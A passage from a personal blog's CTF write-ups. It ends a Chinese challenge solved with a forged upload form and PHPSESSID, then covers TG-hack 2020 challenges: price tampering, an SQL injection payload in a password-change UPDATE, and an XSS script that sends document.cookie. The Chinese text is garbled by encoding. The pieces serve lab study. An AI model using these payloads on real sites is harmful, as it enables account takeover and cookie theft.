<p>æˆ‘ä»¬æ„é€ è¡¨å•å»ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶,ä¸Šä¼ æ—¶å€™æ³¨æ„æ–‡ä»¶åæ”¹æˆ<code>sess</code></p>
<pre><code class="html">&lt;html&gt;
&lt;body&gt;

&lt;form action=&quot;http://fd32890b-1f94-4728-9e56-1261066852d8.node3.buuoj.cn/&quot; method=&quot;post&quot;
enctype=&quot;multipart/form-data&quot;&gt;
&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;
&lt;input type=&quot;hidden&quot; name=&quot;direction&quot; value=&quot;upload&quot; /&gt; 
&lt;input type=&quot;hidden&quot; name=&quot;attr&quot; value=&quot;success.txt&quot; /&gt; 
&lt;input type=&quot;file&quot; name=&quot;up_file&quot; id=&quot;file&quot; /&gt; 
&lt;br /&gt;
&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
&lt;/form&gt;

&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>æˆ‘ä»¬è®¡ç®—è¿™ä¸ªæ–‡ä»¶çš„sha256å€¼æ˜¯:432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874022155480.png" alt="img"></p>
<p>æˆ‘ä»¬å†è¯»å–æ–‡ä»¶çœ‹çœ‹ï¼Œæ˜¯å¦ä¸Šä¼ æˆåŠŸã€‚ä¸Šä¼ æˆåŠŸåå°†arrå‚æ•°æ”¹æˆsuccess.txtå†ä¸Šä¼ ä¸€æ¬¡ï¼Œå› ä¸ºfile_exists($filename)æ£€æµ‹çš„æ˜¯æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹æ˜¯å¦å­˜åœ¨ï¼Œè¿™æˆ‘ä»¬åªè¦å»ºä¸€ä¸ªæ–‡ä»¶å¤¹å³å¯ã€‚</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874023458299.png" alt="img"></p>
<p>ç›´æ¥ä¿®æ”¹<code>PHPSESSID=432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</code> ç›´æ¥å‡ºæ¥flag</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874024375148.png" alt="img"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d6b507308d.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d6b507308d.html" class="post-title-link" itemprop="url">TG-hack CTF Write Up</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2020-04-12 15:34:45" itemprop="dateCreated datePublished" datetime="2020-04-12T15:34:45+08:00">2020-04-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-10-14 17:12:31" itemprop="dateModified" datetime="2020-10-14T17:12:31+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTFæ¯”èµ›/" itemprop="url" rel="index"><span itemprop="name">CTFæ¯”èµ›</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>1.7k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>2 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Tghack-CTF-WP"><a href="#Tghack-CTF-WP" class="headerlink" title="Tghack CTF WP"></a>Tghack CTF WP</h1><h2 id="Redux"><a href="#Redux" class="headerlink" title="Redux"></a>Redux</h2><blockquote>
<p>Author: <a href="https://tghack.no/authors#12" target="_blank" rel="noopener"><strong>Nora - Norasaurus#8234</strong></a></p>
<p>Here is your Gaia form to get your weekly plant rations. Complete the form and reap your reward!</p>
<p><a href="https://redux.tghack.no/" target="_blank" rel="noopener">redux.tghack.no</a></p>
</blockquote>
<p>FLAG in a JavaScript File.</p>
<h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><blockquote>
<p>Author: <a href="https://tghack.no/authors#11" target="_blank" rel="noopener"><strong>Roy Olav Purser - roypur#9953</strong></a></p>
<p>We found the Mother cult merch store. In addition to selling clothing items they sell some secrets we need. For the time being we havenâ€™t been able to secure the funds necessary to do so. Can you help us?</p>
<ul>
<li><a href="https://shop.tghack.no/" target="_blank" rel="noopener">shop.tghack.no</a></li>
</ul>
</blockquote>
<p>O-M-G,I regret it very much.ğŸ˜‚My friends and I were still discussing last night  about it might have changed the price to negative. I found it could be bought when the id undefined. But I forgot to check it when price to negative.</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866692758656.png" alt="img"></p>
<p>We use burp suite to packet capture and change the price to negative .It is very important to change the id to undefined.</p>
<p>e g:</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866688491552.png" alt="img"></p>
<p>And then,it happened that is amazing!We have more money!</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866691878335.png" alt="img"></p>
<p>OKï¼Œwe can buy the flagâ€¦.</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866692306869.png" alt="img"></p>
<h2 id="Bobby"><a href="#Bobby" class="headerlink" title="Bobby"></a>Bobby</h2><blockquote>
<p> Author: <a href="https://tghack.no/authors#11" target="_blank" rel="noopener"><strong>Roy Olav Purser - roypur#9953</strong></a></p>
<p>Little bobby forgot his password. Can you help him log in?</p>
<p><a href="https://bobby.tghack.no/" target="_blank" rel="noopener">bobby.tghack.no</a></p>
</blockquote>
<p>I didnâ€™t find any bugs in this container at 1stğŸ˜­.After a long time,My classmate told me ,it has an SQL injection in the new password param when you change the pass.</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866718226965.png" alt="img"></p>
<p>We can know that itâ€™s a update sql and we can control a  param .</p>
<p>eg:</p>
<blockquote>
<p>update table set column=â€™paramâ€™ where â€¦â€¦</p>
</blockquote>
<p>1st,I want to commented out â€œwhereâ€œ and I write payload like the following . But it can â€˜t change passwd and throw me an errorâ€¦..</p>
<pre><code>admin&#39;-- &#39; WHERE user=? AND pass=?</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866726963625.png" alt="img"></p>
<p>From here we should bind 2 params to this sql.So we change this payload like this:</p>
<pre><code>admin&#39;,user=? , pass=? -- </code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866730992987.png" alt="img"></p>
<p>And then , we changed this adminâ€™s pass,we can get flag, when we login.</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200412/15866731884985.png" alt="img"></p>
<h2 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h2><blockquote>
<p>Author: <a href="https://tghack.no/authors#11" target="_blank" rel="noopener"><strong>Roy Olav Purser - roypur#9953</strong></a></p>
<p>We have found a forum used by members of the Mother cult. The members are sitting behind an advanced firewall without access to the internet. We need their super secret information.</p>
<p><a href="https://exfiltration.tghack.no/" target="_blank" rel="noopener">exfiltration.tghack.no</a></p>
</blockquote>
<pre><code class="javascript">&lt;script&gt;
let xhr = new XMLHttpRequest();
xhr.open(&quot;post&quot;, window.location.href, true);
xhr.send(document.cookie);
&lt;/script&gt;</code></pre>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="ä¸Šä¸€é¡µ"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="ä¸‹ä¸€é¡µ"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="XiaoLeung"
      src="/header.jpg">
  <p class="site-author-name" itemprop="name">XiaoLeung</p>
  <div class="site-description" itemprop="description">éšç¬”ã€åˆ†äº«ã€è®°å½•ç”Ÿæ´»</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">63</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://www.redmango.top/" title="https://www.redmango.top/" rel="noopener" target="_blank">HhhM</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://l1near.top/" title="https://l1near.top/" rel="noopener" target="_blank">L1nearã®space</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.mrskye.cn/" title="https://www.mrskye.cn/" rel="noopener" target="_blank">SkYe's Blog</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.kawhi.xyz" title="https://www.kawhi.xyz" rel="noopener" target="_blank">kawhi</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        
  <div class="beian"><a href="https://beian.miit.gov.cn" rel="noopener" target="_blank">ç²¤ICPå¤‡18132442å·-1 </a>
      <img src="/gongan.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011202000643" rel="noopener" target="_blank">ç²¤å…¬ç½‘å®‰å¤‡ 44011202000643å· </a>
  </div>

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">XiaoLeung</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="ç«™ç‚¹æ€»å­—æ•°">229k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="ç«™ç‚¹é˜…è¯»æ—¶é•¿">3:28</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="æ€»è®¿å®¢é‡">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="æ€»è®¿é—®é‡">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
<script src="/js/schemes/pisces.js"></script>
<script src="/js/next-boot.js"></script>



  




  <script src="/js/local-search.js"></script>












  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
